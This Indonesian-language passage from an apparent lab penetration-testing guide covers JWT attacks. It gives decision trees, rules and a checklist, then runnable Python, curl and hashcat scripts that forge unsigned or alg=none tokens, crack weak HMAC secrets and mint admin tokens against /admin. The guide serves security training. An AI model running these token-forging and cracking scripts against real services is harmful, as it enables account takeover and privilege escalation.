                                  │
             ┌────────────────────┼────────────────────┐
             │                    │                    │
             ▼                    ▼                    ▼
           HS256                RS256                Other
          HS384                 RS384
          HS512                 PS256
             │                    │
             │                    │
             ▼                    ▼
     ┌───────────────┐    ┌─────────────────┐
     │ Weak secret?  │    │ Public key?     │
     └──────┬────────┘    └────────┬────────┘
            │                      │
       ┌────┴────┐            ┌────┴────┐
       │         │            │         │
      YES        NO          YES        NO
       │         │            │         │
       ▼         ▼            ▼         ▼
    hashcat    Test none   RS→HS     Search:
    jwt_tool   / key trust  confusion JWKS
       │                      │         │
       └──────────┐           │         │
                  │           ▼         ▼
                  │        Public key  jku?
                  │           │         │
                  │           │       jwk?
                  │           │         │
                  └────┬──────┴────┬────┘
                       │           │
                       ▼           ▼
                    Forge       Header
                    claims      injections
                       │
                       ▼
                ┌─────────────────┐
                │ Check kid        │
                └────────┬────────┘
                         │
                         ▼
                 ┌───────────────┐
                 │ kid injection │
                 └───────┬───────┘
                         │
                  ┌──────┴──────┐
                  │             │
                  ▼             ▼
                SQLi        Path traversal
                  │             │
                  └──────┬──────┘
                         │
                         ▼
                 Claim Manipulation
                         │
            ┌────────────┼─────────────┐
            │            │             │
            ▼            ▼             ▼
          role         sub/user_id    exp/nbf
            │            │             │
            ▼            ▼             ▼
       Privilege       IDOR         Replay
       escalation      chain
                         │
                         ▼
                  Information Disclosure
```

---

## Master Priority Order

```text
JWT found
   ↓
Decode
   ↓
alg?
   ↓
Inspect claims
   ↓
Check signature behavior
   ↓
HS? → weak secret
   ↓
RS? → public key / confusion
   ↓
jwk/jku?
   ↓
kid?
   ↓
sub/role?
   ↓
exp?
   ↓
Replay?
```

---

# 🧯 7 — Common Errors & Troubleshooting

|Error|Sebab|Solusi|
|---|---|---|
|Signature verification failed|Secret/key salah|Verify key dan algorithm|
|Token expired|`exp` sudah lewat|Gunakan token lab baru atau cek expiry handling|
|Algorithm not supported|Server/library tidak menerima alg tersebut|Inspect allowed algorithms|
|Public key tidak bisa didapat|Tidak exposed pada endpoint|Cari JWKS, source, metadata, certificate, atau derive bila lab mengizinkan|
|hashcat tidak crack|Secret tidak ada di wordlist|Targeted wordlist/rules|
|jku server tidak bisa direach|Egress blocked|Verifikasi routing/network interface|
|kid injection tidak bekerja|`kid` di-whitelist|Cari key IDs yang valid|
|`none` ditolak|Server strict|Beralih ke weak secret/key confusion/header attacks|
|`None` ditolak|Case normalized|Jangan asumsikan case bypass|
|`nOnE` ditolak|Parser strict|Stop none path|
|Modified payload tetapi 401|Signature masih diverifikasi|Cari signing key atau signature bypass|
|JWT valid tapi admin tetap 403|Claim bukan sumber authorization|Cari server-side role mapping|
|Role berubah tetapi privilege tidak berubah|Role hanya informational|Inspect actual authorization layer|
|UUID claim berubah tetapi identity tidak berubah|Server mengambil identity dari session/backend|Test object reference lain|
|Token replay gagal setelah logout|Revocation implemented|Cari token lifecycle behavior|
|Token tanpa exp ditolak|`exp` wajib|Tidak ada expiry bypass|
|JKU callback tidak muncul|Target tidak fetch remote key|Cek jku support/trusted host restrictions|
|JWK token ditolak|Key provenance validated|JWK injection tidak applicable|
|JKU accepted tetapi key ignored|Host/key validation|Cari trusted domain limitation|
|KID path traversal ditolak|Path canonicalized|Cari source/key lookup behavior|
|KID SQLi tidak memunculkan error|Prepared statements|SQLi path tidak applicable|
|JWT terlihat base64 tetapi decode error|Bukan JWT atau segment rusak|Cek tiga segments dan Base64URL|
|jwt_tool command unknown|Versi berbeda|Gunakan `python3 jwt_tool.py -h`|
|`-X s` tidak bekerja untuk confusion|Flag salah|Current jwt_tool: `-X k` untuk key confusion|
|`-ru` tidak dikenal|Syntax versi lama|Gunakan `-t` + `-M pb` sesuai current CLI|
|hashcat says token separator error|Input malformed|Simpan complete 3-part JWT|
|HS256 crack terlalu lambat|Secret panjang/random|Gunakan targeted dictionary sebelum brute force luas|
|Public key PEM ditolak sebagai HMAC secret|Crypto library memblok unsafe key reuse|Gunakan target-compatible representation/JWT Editor pada lab|
|Signature valid lokal tetapi server menolak|Wrong key format/claim validation/aud|Compare all header/payload fields|
|`aud` mismatch|Audience validation aktif|Gunakan audience legitimate dari token lab|
|`iss` mismatch|Issuer validation aktif|Preserve correct issuer|
|`nbf` error|Token belum valid|Test controlled timestamp|
|Time claim behaves oddly|Unit mismatch|Cek seconds vs milliseconds|
|Cookie token tidak dipakai|Auth berada di Authorization header|Reproduce exact original location|
|Authorization header ignored|Endpoint memakai cookie|Copy original request format|
|Token works on one endpoint only|Audience/scope differs|Test API authorization separately|
|Response sama untuk forged token|Claim tidak authoritative|Cari server-side identity/role lookup|

---

# 🏆 8 — Golden Rules

## Rule 1 — Decode ≠ Verify

```text
decode(payload)
    ≠
verify(signature)
```

Base64 bukan security boundary.

---

## Rule 2 — Payload Bukan Encrypted

```text
JWT
 ↓
Base64URL
 ↓
Readable claims
```

Jangan menyimpan secret di payload.

---

## Rule 3 — `alg` Adalah Security Boundary

Jangan berpikir:

```text
alg = metadata
```

Pada implementasi buruk:

```text
attacker controls alg
     ↓
attacker controls verification behavior
```

---

## Rule 4 — HS dan RS Berbeda Fundamental

```text
HS:
same secret signs + verifies

RS:
private signs
public verifies
```

Algorithm confusion memanfaatkan kekacauan di antara dua model tersebut.

---

## Rule 5 — Public Key Bukan Secret

Pada RS256:

```text
public key
```

memang boleh diketahui.

Yang dicari:

```text
implementation flaw
```

bukan sekadar:

```text
"Can I download the public key?"
```

---

## Rule 6 — `jwk`, `jku`, `kid` = Key Selection Attack Surface

```text
jwk → which key?
jku → where is key?
kid → which key ID?
```

Pertanyakan:

```text
Who controls it?
Who validates it?
```

---

## Rule 7 — Role Claim Tidak Otomatis Trusted

```json
{
  "role": "admin"
}
```

hanya string.

Server harus memastikan claim tersebut:

```text
signed
valid
trusted
authorized
```

---

## Rule 8 — `sub` Sering Menjadi Jembatan ke IDOR

```text
JWT sub
  ↓
user identity
  ↓
object reference
```

Cross-reference:

← [File 27: IDOR](/docs/idor-access-control)

---

## Rule 9 — `exp` Bukan Satu-Satunya Security Claim

Perhatikan:

```text
exp
nbf
iat
aud
iss
jti
```

JWT bisa valid secara cryptographic tetapi tidak valid secara business/security context.

---

## Rule 10 — Response Harus Dibandingkan

Bandingkan:

```text
normal token
forged token
wrong signature
expired token
```

Lihat:

```text
status
body
redirect
headers
```

---

## Rule 11 — Always Preserve Original Token

Simpan:

```text
original.jwt
```

sebelum modifikasi.

---

## Rule 12 — One Variable at a Time

Jangan langsung mengubah:

```text
alg
kid
sub
role
exp
```

semuanya sekaligus.

Lebih baik:

```text
test alg
↓
test kid
↓
test claim
```

agar sebab keberhasilan diketahui.

---

## Rule 13 — Tool Result ≠ Finding

```text
jwt_tool says:
"possible"
```

belum sama dengan:

```text
confirmed privilege escalation
```

---

## Rule 14 — Prove Impact

Bukti kuat:

```text
ordinary user
     ↓
forged JWT
     ↓
admin endpoint
     ↓
admin-only response
```

---

## Rule 15 — Signature Failure dan Authorization Failure Berbeda

```text
signature valid
    ≠
authorization valid
```

JWT authentication dapat benar tetapi authorization tetap rusak.

---

# ✅ 9 — Final Checklist

```text
[ ] JWT ditemukan
[ ] Lokasi token dicatat
[ ] Authorization header diperiksa
[ ] Cookie diperiksa
[ ] localStorage diperiksa
[ ] response body diperiksa
[ ] JWT memiliki 3 segments
[ ] Header decoded
[ ] Payload decoded
[ ] Signature dipahami
[ ] alg dicatat
[ ] typ dicatat
[ ] kid diperiksa
[ ] jku diperiksa
[ ] jwk diperiksa
[ ] x5u diperiksa
[ ] x5c diperiksa
[ ] sub dicatat
[ ] iss dicatat
[ ] aud dicatat
[ ] exp dicatat
[ ] nbf dicatat
[ ] iat dicatat
[ ] jti dicatat
[ ] role diperiksa
[ ] user_id diperiksa
[ ] is_admin diperiksa
[ ] permissions diperiksa
[ ] HS/RS/ES/PS ditentukan
[ ] None algorithm diuji bila relevan
[ ] Variasi none diuji
[ ] Signature verification behavior diuji
[ ] Weak secret hypothesis diuji
[ ] hashcat dicoba bila HS secret terlihat lemah
[ ] jwt_tool digunakan
[ ] Public key dicari bila asymmetric
[ ] Algorithm confusion diuji bila relevan
[ ] kid filesystem behavior diperiksa
[ ] kid SQL lookup diperiksa bila ada evidence
[ ] jku behavior diperiksa
[ ] jku outbound callback diperiksa
[ ] jwk behavior diperiksa
[ ] x5u/x5c behavior diperiksa bila relevan
[ ] Token replay diuji
[ ] Logout replay diuji
[ ] Expiry validation diuji
[ ] Role manipulation diuji setelah signature primitive tersedia
[ ] sub/user_id manipulation diuji
[ ] IDOR chain diuji
[ ] API authorization diuji
[ ] Admin endpoint diuji
[ ] Normal vs forged response dibandingkan
[ ] Evidence request disimpan
[ ] Evidence response disimpan
[ ] Exact vulnerability primitive dicatat
[ ] Impact dibuktikan
```

---

# 🔗 10 — Cross-Workflow

JWT jarang berdiri sendirian.

Model chain:

```text
                         JWT
                          │
             ┌────────────┼─────────────┐
             │            │             │
             ▼            ▼             ▼
           IDOR          API          OAuth/SSO
             │            │             │
             ▼            ▼             ▼
      object reference  token trust   identity trust
             │            │             │
             └────────────┼─────────────┘
                          ▼
                    Access Control
                          │
            ┌─────────────┼─────────────┐
            │             │             │
            ▼             ▼             ▼
           Role         sub/user_id    aud/iss
            │             │             │
            ▼             ▼             ▼
        Privilege       IDOR          token
        escalation       chain        confusion
                          │
                          ▼
                     Sensitive API
                          │
             ┌────────────┼────────────┐
             │            │            │
             ▼            ▼            ▼
            SSRF         LFI        Upload
             │            │            │
             ▼            ▼            ▼
         internal      file read    shell/upload
         services        │            │
             │           │            │
             └───────────┼────────────┘
                         ▼
                       RCE
```

---

# 10.1 🔐 JWT + IDOR

```text
JWT:
sub=100

API:
/api/orders/100
```

Jika attacker:

```text
forge JWT
sub=101
```

lalu mendapat:

```text
User B orders
```

chain:

```text
JWT forgery
   +
IDOR/identity manipulation
```

Cross-reference:

← [File 27: IDOR](/docs/idor-access-control)

---

# 10.2 🌐 JWT + API Security

JWT sering menjadi security boundary pada:

```text
REST API
GraphQL
mobile API
WebSocket
microservices
```

Flow:

```text
JWT
 ↓
API authentication
 ↓
API authorization
 ↓
object reference
 ↓
IDOR
```

Next API workflow:

```text
./[🔌 30 — API Security Workflow](/docs/api-security)
```

---

# 10.3 🔑 JWT + OAuth / SSO

Dalam ecosystem OAuth/SSO, token dapat muncul pada:

```text
Access Token
ID Token
JWT assertions
OIDC
```

Model:

```text
Identity Provider
       │
       ▼
    JWT/ID Token
       │
       ▼
Application
       │
       ▼
Identity / Claims
```

Attack surface:

```text
iss
aud
sub
nonce
exp
signature
JWK/JWKS
key rotation
```

Mental model penting:

```text
"Token valid"
    ≠
"Token valid untuk aplikasi ini"
```

Karena itu `aud` dan `iss` penting.

---

# 10.4 🔥 Example Full Chain

```text
JWT ditemukan
      ↓
HS256
      ↓
weak secret = secret123
      ↓
forge token
      ↓
sub=administrator
role=admin
      ↓
Admin API
      ↓
discover IDOR
      ↓
access object lain
      ↓
private file
      ↓
File Upload/LFI/SSRF/etc.
      ↓
higher impact
```

Chain yang baik selalu menunjukkan:

```text
primitive
   ↓
authorization consequence
   ↓
impact
```

---

# 🧠 11 — One-Line Muscle Memory

```text
FIND JWT → DECODE → READ alg/kid/jku/jwk → READ sub/role/aud/iss/exp → VERIFY TRUST MODEL → HS? CRACK SECRET → RS? GET PUBLIC KEY → TEST CONFUSION/JKU/JWK → TEST KID → FORGE CLAIMS → REPLAY → PROVE IMPACT
```

Versi super singkat:

```text
JWT → ALG → KEY TRUST → CLAIMS → SIGNATURE → AUTHORIZATION → IMPACT
```

---

# ⚡ 60-Second JWT Workflow

```text
                    JWT FOUND
                        │
                        ▼
                   Decode Header
                   Decode Payload
                        │
                        ▼
                    Check alg
                        │
          ┌─────────────┼──────────────┐
          │             │              │
          ▼             ▼              ▼
         HS            RS/ES          none?
          │             │              │
          ▼             ▼              ▼
      weak secret   public key      signature
      /crack        available?      verification
          │             │           test
          ▼         ┌───┴───┐         │
        forge       │       │         ▼
                   YES      NO      bypass?
                    │        │
                    ▼        ▼
                confusion   jku/jwk
                    │        │
                    └───┬────┘
                        ▼
                      kid
                        │
               ┌────────┴────────┐
               │                 │
               ▼                 ▼
             SQLi            traversal
               │                 │
               └────────┬────────┘
                        ▼
                  Claim Analysis
                        │
             ┌──────────┼──────────┐
             │          │          │
             ▼          ▼          ▼
            sub        role        exp
             │          │          │
             ▼          ▼          ▼
            IDOR      admin      replay
             │          │          │
             └──────────┼──────────┘
                        ▼
                    API/Admin
                        │
                        ▼
                    Prove Impact
```

---

# 🎯 Final Mental Model

Ketika menemukan JWT, jangan langsung berpikir:

```text
"decode token lalu ganti role."
```

Gunakan urutan:

```text
1. Apa algorithm-nya?
2. Siapa yang menentukan verification algorithm?
3. Dari mana verification key berasal?
4. Apakah key source dapat dikontrol?
5. Apakah signature benar-benar diverifikasi?
6. Claims mana yang menentukan identity?
7. Claims mana yang menentukan privilege?
8. Apakah expiry/audience/issuer diverifikasi?
9. Apakah token bisa direplay?
10. Setelah token dipercaya, endpoint apa yang dapat diakses?
```

Visualisasikan:

```text
                    JWT
                     │
          ┌──────────┴──────────┐
          │                     │
       CRYPTO                 CLAIMS
          │                     │
      ┌───┼────┐          ┌─────┼─────┐
      │   │    │          │     │     │
     alg key  sig         sub   role   exp
      │   │    │          │     │     │
      ▼   ▼    ▼          ▼     ▼     ▼
    trust source verify   ID    ACL   time
      │   │    │          │     │     │
      └───┴────┴──────────┴─────┴─────┘
                     │
                     ▼
                AUTHORIZATION
                     │
                     ▼
                   IMPACT
```

JWT security pada akhirnya bukan tentang Base64.

Bukan juga tentang:

```text
"Apakah saya bisa mengubah payload?"
```

Pertanyaan utamanya adalah:

```text
WHO CHOOSES THE ALGORITHM?
WHO CONTROLS THE KEY?
IS THE SIGNATURE REALLY VERIFIED?
WHICH CLAIMS CONTROL IDENTITY?
WHICH CLAIMS CONTROL AUTHORIZATION?
IS THE TOKEN VALID FOR THIS APPLICATION?
```

---
# 28 — JWT Complete Attack Workflow 🔐

> **Cara baca dokumen ini:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL/BERBEDA** ❌. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah.

---

## 🔧 PRE-FLIGHT: Setup Environment

Bash

```
# Jalankan INI DULU sebelum apapun
export TARGET="http://10.10.11.200"
export LHOST="10.10.14.5"
export LPORT="4444"

# Setup direktori kerja
mkdir -p ~/jwt_loot/{tokens,keys,scripts,evidence}
cd ~/jwt_loot

# Install dependencies
pip3 install pyjwt cryptography 2>/dev/null
git clone https://github.com/ticarpi/jwt_tool.git ~/tools/jwt_tool 2>/dev/null
cd ~/tools/jwt_tool && pip3 install -r requirements.txt -q 2>/dev/null
cd ~/jwt_loot

echo "[*] Target: $TARGET | JWT workspace ready"
```

**Output yang diharapkan:**

text

```
[*] Target: http://10.10.11.200 | JWT workspace ready
```

---

## ═══════════════════════════════════════

## FASE 0: IDENTIFIKASI JWT

## ═══════════════════════════════════════

> **Tujuan:** Temukan JWT di aplikasi. JWT selalu berbentuk `xxxxx.yyyyy.zzzzz` (3 bagian dipisah titik, Base64URL encoded).

### Langkah 0.1 — Cari JWT di Response & Storage

Bash

```
# Command 1: Login dan capture response
curl -si -X POST \
  -H 'Content-Type: application/json' \
  -d '{"username":"wiener","password":"peter"}' \
  $TARGET/login \
  -c ~/jwt_loot/cookies.txt \
  | tee ~/jwt_loot/login_response.txt

# Command 2: Grep JWT pattern dari response
grep -Eo 'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*' \
  ~/jwt_loot/login_response.txt \
  | tee ~/jwt_loot/tokens/found_tokens.txt

# Command 3: Cek cookie file
cat ~/jwt_loot/cookies.txt | grep -v "^#" | grep -Eo 'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*'

# Command 4: Cari JWT di JS bundle
curl -s $TARGET/static/app.js -o /tmp/app.js 2>/dev/null
grep -Eo 'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*' /tmp/app.js
```

**OUTPUT BERHASIL ✅ — JWT ditemukan di response body:**

JSON

```
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ3aWVuZXIiLCJyb2xlIjoidXNlciIsImlhdCI6MTcwMDAwMDAwMH0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
  "token_type": "Bearer"
}
```

**OUTPUT BERHASIL ✅ — JWT ditemukan di Set-Cookie:**

text

```
HTTP/1.1 200 OK
Set-Cookie: session=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ3aWVuZXIifQ.signature; HttpOnly
```

**Cara baca lokasi JWT:**

|Lokasi|Cara Extract|Cara Kirim|
|---|---|---|
|Set-Cookie|`grep Set-Cookie response.txt`|`-H "Cookie: session=TOKEN"`|
|Response body `access_token`|`jq '.access_token'`|`-H "Authorization: Bearer TOKEN"`|
|localStorage|Browser DevTools → Application tab|-|
|Authorization header|Burp Proxy HTTP history|Salin dari request|

**OUTPUT GAGAL ❌ — Tidak ada JWT di login:**

text

```
HTTP/1.1 200 OK
Set-Cookie: sessionid=abc123def; HttpOnly
```

➡️ Ini session cookie biasa, bukan JWT. Cek apakah ada endpoint API terpisah:

Bash

```
# Cek endpoint API yang mungkin return JWT
curl -si $TARGET/api/login -X POST \
  -H 'Content-Type: application/json' \
  -d '{"username":"wiener","password":"peter"}'

curl -si $TARGET/api/auth/token -X POST \
  -H 'Content-Type: application/json' \
  -d '{"username":"wiener","password":"peter"}'
```

---

### Langkah 0.2 — Simpan dan Decode JWT

Bash

```
# Simpan token ke variabel
export JWT="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ3aWVuZXIiLCJyb2xlIjoidXNlciIsImlhdCI6MTcwMDAwMDAwMH0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
echo $JWT > ~/jwt_loot/tokens/original.jwt

# Command 1: Decode dengan Python (paling reliable)
python3 << 'EOF'
import base64, json, sys

jwt = open('/root/jwt_loot/tokens/original.jwt').read().strip()
parts = jwt.split('.')

def b64d(s):
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s).decode()

print("=== HEADER ===")
header = json.loads(b64d(parts[0]))
print(json.dumps(header, indent=2))

print("\n=== PAYLOAD ===")
payload = json.loads(b64d(parts[1]))
print(json.dumps(payload, indent=2))

print("\n=== KEY FIELDS TO NOTE ===")
print(f"Algorithm (alg): {header.get('alg', 'NOT SET')}")
print(f"Key ID (kid): {header.get('kid', 'NOT PRESENT')}")
print(f"JKU URL (jku): {header.get('jku', 'NOT PRESENT')}")
print(f"JWK embedded (jwk): {'PRESENT' if 'jwk' in header else 'NOT PRESENT'}")
print(f"Subject (sub): {payload.get('sub', 'NOT SET')}")
print(f"Role: {payload.get('role', 'NOT SET')}")
print(f"Is Admin: {payload.get('is_admin', 'NOT SET')}")
print(f"Expiry (exp): {payload.get('exp', 'NOT SET')}")
EOF

# Command 2: Decode dengan jwt_tool
python3 ~/tools/jwt_tool/jwt_tool.py $JWT
```

**OUTPUT BERHASIL ✅ — Decode berhasil:**

text

```
=== HEADER ===
{
  "alg": "HS256",
  "typ": "JWT"
}

=== PAYLOAD ===
{
  "sub": "wiener",
  "role": "user",
  "iat": 1700000000
}

=== KEY FIELDS TO NOTE ===
Algorithm (alg): HS256
Key ID (kid): NOT PRESENT
JKU URL (jku): NOT PRESENT
JWK embedded (jwk): NOT PRESENT
Subject (sub): wiener
Role: user
Is Admin: NOT SET
Expiry (exp): NOT SET
```

➡️ **CATAT SEMUA INI!** Berdasarkan `alg`, tentukan attack path:

|Algorithm|Attack Path Prioritas|
|---|---|
|`HS256/HS384/HS512`|→ **Fase 1** (None Attack) → **Fase 2** (Weak Secret)|
|`RS256/RS384/RS512`|→ **Fase 1** (None Attack) → **Fase 3** (Algorithm Confusion)|
|`ES256/ES384/ES512`|→ **Fase 1** (None Attack) → Cek jku/jwk|
|`none`|Server sudah salah! → Langsung forge token|

---

## ═══════════════════════════════════════

## FASE 1: SIGNATURE BYPASS (SELALU TEST INI DULU!)

## ═══════════════════════════════════════

> **Tujuan:** Test apakah server memverifikasi signature sama sekali. Ini yang paling mudah dan harus selalu dicoba pertama.

### Langkah 1.1 — Unverified Signature Test

Bash

```
# Test: Ubah payload tapi biarkan signature asli (atau random)
# Jika server tidak verifikasi signature → LANGSUNG DAPAT AKSES ADMIN!

python3 << 'EOF'
import base64, json

def b64u(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

# Buat token dengan payload diubah tapi signature random/asli
header = {"alg": "HS256", "typ": "JWT"}
payload = {"sub": "administrator", "role": "admin", "iat": 1700000000}

h = b64u(json.dumps(header, separators=(',', ':')))
p = b64u(json.dumps(payload, separators=(',', ':')))

# Signature yang salah/random
fake_sig = "INVALIDSIGNATURETHISSHOULDNOTWORK"

token = f"{h}.{p}.{fake_sig}"
print(f"[*] Token dengan signature palsu:")
print(token)
EOF
```

Bash

```
# Test ke server
export TEST_TOKEN="PASTE_TOKEN_DARI_ATAS"

# Jika JWT di cookie
curl -si \
  -H "Cookie: session=$TEST_TOKEN" \
  $TARGET/admin | head -20

# Jika JWT di Authorization header  
curl -si \
  -H "Authorization: Bearer $TEST_TOKEN" \
  $TARGET/admin | head -20
```

**OUTPUT BERHASIL ✅ — UNVERIFIED SIGNATURE (JACKPOT!):**

text

```
HTTP/1.1 200 OK
Content-Type: text/html

<h1>Admin panel</h1>
```

➡️ Server tidak verifikasi signature sama sekali! Forge token sesuka hati dan lanjut ke **Fase 6 (Claim Manipulation)**.

**OUTPUT GAGAL ❌ — Signature diverifikasi:**

text

```
HTTP/1.1 401 Unauthorized
{"error": "Invalid token signature"}
```

➡️ Normal, lanjut ke **Langkah 1.2 — None Algorithm Attack**.

---

### Langkah 1.2 — None Algorithm Attack

Bash

```
# Buat token dengan alg=none (berbagai variasi case)
python3 << 'EOF'
import base64, json

def b64u(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

payload = {"sub": "administrator", "role": "admin", "iat": 1700000000}
p = b64u(json.dumps(payload, separators=(',', ':')))

# Test semua variasi none
for alg_value in ["none", "None", "NONE", "nOnE", "NoNe"]:
    header = {"alg": alg_value, "typ": "JWT"}
    h = b64u(json.dumps(header, separators=(',', ':')))
    # Token unsigned: header.payload. (trailing dot WAJIB!)
    token = f"{h}.{p}."
    print(f'alg="{alg_value}": {token[:80]}...')
    print(f'  Full: {token}')
    print()
EOF
```

Bash

```
# Test setiap variasi ke server
for ALG in "none" "None" "NONE" "nOnE"; do
  # Buat token
  TOKEN=$(python3 -c "
import base64, json
def b64u(d):
    if isinstance(d,str): d=d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()
h=b64u(json.dumps({'alg':'$ALG','typ':'JWT'},separators=(',',':')))
p=b64u(json.dumps({'sub':'administrator','role':'admin'},separators=(',',':')))
print(f'{h}.{p}.')
")
  
  STATUS=$(curl -so /dev/null -w "%{http_code}" \
    -H "Cookie: session=$TOKEN" \
    $TARGET/admin)
  
  echo "alg=$ALG → HTTP $STATUS"
done
```

**OUTPUT BERHASIL ✅ — None algorithm diterima:**

text

```
alg=none  → HTTP 200
alg=None  → HTTP 401
alg=NONE  → HTTP 401
alg=nOnE  → HTTP 401
```

➡️ `alg=none` berhasil! Forge token admin dengan cara ini dan lanjut ke **Fase 6**.

**OUTPUT GAGAL ❌ — Semua none ditolak:**

text

```
alg=none → HTTP 401
alg=None → HTTP 401
alg=NONE → HTTP 401
alg=nOnE → HTTP 401
```

➡️ Server menolak none algorithm. Lanjut ke attack sesuai algoritma:

- **HS256** → **Fase 2** (Weak Secret Brute Force)
- **RS256** → **Fase 3** (Algorithm Confusion) atau **Fase 4** (JKU/JWK Injection)

---

## ═══════════════════════════════════════

## FASE 2: WEAK SECRET BRUTE FORCE (HS256/HS384/HS512)

## ═══════════════════════════════════════

> Hanya untuk JWT dengan algoritma HMAC (HS256, HS384, HS512). Secret di-crack OFFLINE, tidak perlu kirim request ke server.

### Langkah 2.1 — Siapkan Wordlist & Crack dengan hashcat

Bash

```
# Simpan JWT lengkap untuk hashcat (HARUS full 3-part format!)
echo "$JWT" > ~/jwt_loot/tokens/crack_target.txt
cat ~/jwt_loot/tokens/crack_target.txt  # Verifikasi isinya lengkap

# Buat wordlist khusus JWT (mulai dari yang paling common)
cat > ~/jwt_loot/jwt_secrets.txt << 'EOF'
secret
password
password123
admin
admin123
123456
12345678
qwerty
letmein
welcome
changeme
secret123
jwtsecret
jwt-secret
jwt_secret
mysecret
supersecret
test
test123
dev
development
production
default
key
secretkey
secret-key
private
token
your-256-bit-secret
your-secret
mySecret
EOF

# Tambahkan nama aplikasi/domain jika ketahuan
echo "$TARGET" | sed 's|http://||;s|https://||;s|/.*||' >> ~/jwt_loot/jwt_secrets.txt

# Command 1: hashcat (PALING CEPAT - pakai GPU)
hashcat -a 0 -m 16500 \
  ~/jwt_loot/tokens/crack_target.txt \
  ~/jwt_loot/jwt_secrets.txt \
  -o ~/jwt_loot/cracked.txt \
  --show 2>/dev/null || \
hashcat -a 0 -m 16500 \
  ~/jwt_loot/tokens/crack_target.txt \
  ~/jwt_loot/jwt_secrets.txt

# Command 2: Jika hashcat gagal, coba rockyou
hashcat -a 0 -m 16500 \
  ~/jwt_loot/tokens/crack_target.txt \
  /usr/share/wordlists/rockyou.txt

# Command 3: jwt_tool dictionary attack
python3 ~/tools/jwt_tool/jwt_tool.py \
  "$JWT" -C -d ~/jwt_loot/jwt_secrets.txt
```

**OUTPUT BERHASIL ✅ — Secret ditemukan:**

text

```
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ3aWVuZXIifQ.SIGNATURE:secret123

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 16500 (JWT (JSON Web Token))
Recovered........: 1/1 (100.00%)
```

Bash

```
# Tampilkan hasil
hashcat -m 16500 ~/jwt_loot/tokens/crack_target.txt ~/jwt_loot/jwt_secrets.txt --show
# Output: TOKEN:secret123

# Simpan secret
export JWT_SECRET="secret123"
echo "JWT Secret: $JWT_SECRET" >> ~/jwt_loot/evidence/findings.txt
echo "[+] SECRET FOUND: $JWT_SECRET"

# Verifikasi secret dengan Python
python3 << EOF
import jwt
try:
    decoded = jwt.decode("$JWT", "$JWT_SECRET", algorithms=["HS256"])
    print(f"[+] Secret verified: {JWT_SECRET}")
    print(f"[+] Payload: {decoded}")
except Exception as e:
    print(f"[-] Verification failed: {e}")
EOF
```

➡️ Secret valid! Lanjut ke **Fase 6 (Forge Token)** dengan secret yang sudah diketahui.

**OUTPUT GAGAL ❌ — Secret tidak ditemukan:**

text

```
Status...........: Exhausted
Recovered........: 0/1
```

➡️ Coba wordlist lebih besar:

Bash

```
# Coba dengan rules mutation
hashcat -a 0 -m 16500 \
  ~/jwt_loot/tokens/crack_target.txt \
  ~/jwt_loot/jwt_secrets.txt \
  -r /usr/share/hashcat/rules/best64.rule

# Coba SecLists JWT wordlist
hashcat -a 0 -m 16500 \
  ~/jwt_loot/tokens/crack_target.txt \
  /usr/share/seclists/Passwords/Common-Credentials/best1050.txt

# Coba brute force pendek (max 6 karakter)
hashcat -a 3 -m 16500 \
  ~/jwt_loot/tokens/crack_target.txt \
  "?l?l?l?l?l?l" --increment --increment-min 3
```

> **Google search jika buntu:** `"JWT secret wordlist site:github.com"` atau `"hashcat mode 16500 rules JWT"`

➡️ Jika masih tidak bisa crack → secret kemungkinan kuat/random. Beralih ke **Fase 3 atau Fase 4**.

---

### Langkah 2.2 — Forge Token Setelah Secret Ditemukan

Bash

```
# Forge token admin dengan secret yang diketahui
python3 << EOF
import jwt, json, time

SECRET = "$JWT_SECRET"

# Forge sebagai administrator
admin_payload = {
    "sub": "administrator",
    "role": "admin",
    "is_admin": True,
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600
}

token = jwt.encode(admin_payload, SECRET, algorithm="HS256")
print(f"[+] Forged admin token:")
print(token)

# Juga forge sebagai user lain (untuk IDOR test)
for uid in ["1", "2", "101", "admin"]:
    payload = {"sub": uid, "role": "user", "iat": int(time.time())}
    t = jwt.encode(payload, SECRET, algorithm="HS256")
    print(f"\n[*] Token as sub={uid}:")
    print(t)
EOF
```

Bash

```
# Test forged token
export FORGED="PASTE_FORGED_TOKEN"
curl -si \
  -H "Authorization: Bearer $FORGED" \
  $TARGET/admin

# Atau via cookie
curl -si \
  -H "Cookie: session=$FORGED" \
  $TARGET/admin
```

**OUTPUT BERHASIL ✅ — Admin access:**

text

```
HTTP/1.1 200 OK
<h1>Admin Panel</h1>
<p>Welcome, administrator!</p>
```

---

## ═══════════════════════════════════════

## FASE 3: ALGORITHM CONFUSION RS256 → HS256

## ═══════════════════════════════════════

> Hanya untuk JWT dengan RS256/RS384/RS512. Kita butuh RSA public key, lalu gunakan sebagai HMAC secret.

### Langkah 3.1 — Dapatkan RSA Public Key

Bash

```
# Common endpoints untuk public key / JWKS
ENDPOINTS=(
  "/.well-known/jwks.json"
  "/jwks.json"
  "/api/keys"
  "/api/.well-known/jwks.json"
  "/auth/keys"
  "/oauth/jwks"
  "/.well-known/openid-configuration"
  "/public.pem"
  "/public_key.pem"
)

for ep in "${ENDPOINTS[@]}"; do
  STATUS=$(curl -so /tmp/jwks_test.txt -w "%{http_code}" "$TARGET$ep")
  if [[ "$STATUS" == "200" ]]; then
    echo "[+] Found: $TARGET$ep"
